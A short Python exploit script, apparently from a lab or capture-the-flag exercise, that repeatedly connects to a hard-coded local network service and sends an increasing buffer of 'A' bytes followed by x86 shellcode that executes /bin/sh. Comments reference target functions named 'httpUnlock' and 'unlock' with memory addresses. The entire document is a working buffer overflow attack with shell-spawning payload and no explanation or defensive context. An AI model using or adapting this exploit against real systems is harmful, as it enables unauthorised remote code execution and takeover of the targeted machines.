import socket
import time 
import struct

HOST = '192.168.1.10'
PORT = 10589

#HOST = 'localhost'
#PORT = 10077

def main():
    i = 0 
    while i < 2500:
       with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
         
         buf = b""
         buf += b"A"*(1024 + i)
         #buf += b'\xa2\x9e\x04\x08' #08049ea2 <httpUnlock>
         buf += b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' #08048e3c <unlock> 
         print(buf)
         s.send(buf)
         i += 1 
   
if __name__ == '__main__':
    main()
